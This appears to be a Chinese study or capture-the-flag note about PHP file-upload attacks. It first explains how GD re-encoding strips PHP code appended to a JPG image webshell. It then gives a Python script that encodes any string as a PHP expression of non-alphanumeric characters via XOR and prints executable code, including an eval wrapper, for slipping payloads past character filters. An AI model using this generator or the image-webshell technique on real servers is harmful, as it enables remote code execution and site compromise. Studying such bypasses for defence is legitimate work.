你上传：一个伪装成 JPG 的图片马（例如在图片末尾加了 PHP 代码）。

系统读取：imagecreatefromjpeg() 打开你的文件。

如果图片是损坏的，或者根本不是 JPG，这一步就会返回 false，文件被删除。

如果图片是合法的 JPG（能打开），它会创建一个图像资源 $im。

系统重绘：imagejpeg($im, $img_path) 用这个图像资源重新生成一张全新的 JPG 图片。

结果：

你原先藏在图片末尾的 PHP 代码：imagejpeg() 在生成新图片时，只保留像素数据，会丢弃所有额外附加的数据（如文件尾部的注释或木马代码）。

最终保留的图片：是一张干干净净、由 PHP GD 库重新绘制的纯图片，不含任何木马。

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import string


# 可作为字面量直接使用的字符
def is_literal_ok(c):
    o = ord(c)
    if o < 32 or o > 126:
        return False
    if c in string.ascii_letters + string.digits:
        return False
    return True


# 可用于 XOR 构造的字符集合（x 和 y）
CAND = [i for i in range(32, 127)
        if chr(i) not in string.ascii_letters + string.digits]


# 可选：排除 @ 符号（避免 PHP 语法错误）
# CAND = [i for i in CAND if chr(i) != '@']

def esc_char(c):
    if c == "'":
        return "\\'"
    if c == "\\":
        return "\\\\"
    return c


def build_xor_char(t):
    t = ord(t)
    for x in CAND:
        y = x ^ t
        if y in CAND:
            return chr(x), chr(y)
    return None  # 注意缩进！这里要和 for 对齐


def build_expr(s):
    parts = []
    for ch in s:
        # 可以直接当字面量
        if is_literal_ok(ch):
            parts.append("'" + esc_char(ch) + "'")
        else:
            # 必须走 XOR
            r = build_xor_char(ch)
            if not r:
                raise Exception(f"字符 {ch} 无法构造")
            x, y = r
            parts.append("('%s'^'%s')" % (esc_char(x), esc_char(y)))
    return ".".join(parts)


if __name__ == "__main__":
    target = input("target string: ")
    expr = build_expr(target)
    print("\nPHP expression:\n")
    print(expr)

    # 同时生成可直接执行的 PHP 代码
    print("\nPHP code:\n")
    print(f"<?= {expr}; ?>")
    print(f"<?php $a = {expr}; eval($a); ?>")
